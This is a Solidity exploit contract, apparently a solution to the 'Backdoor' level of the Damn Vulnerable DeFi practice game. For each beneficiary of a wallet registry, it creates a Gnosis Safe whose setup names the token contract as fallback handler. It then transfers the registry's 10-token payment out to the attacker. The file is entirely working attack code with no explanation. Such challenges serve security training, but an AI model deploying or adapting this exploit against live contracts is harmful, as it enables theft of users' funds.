// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";

contract BackdoorAttack {
    uint256 constant registryTokenPayment = 10 ether;

    constructor(
        GnosisSafe masterCopy,
        GnosisSafeProxyFactory walletFactory,
        DamnValuableToken token,
        IProxyCreationCallback walletRegistry,
        address[] memory beneficiaries
    ) {
        address attacker = msg.sender;
        address[] memory owners = new address[](1);

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            owners[0] = beneficiaries[i];

            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(0),
                bytes(""),
                address(token),
                address(0),
                0,
                payable(address(0))
            );

            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                666,
                walletRegistry
            );

            DamnValuableToken(address(proxy)).transfer(
                attacker,
                registryTokenPayment
            );
        }
    }
}
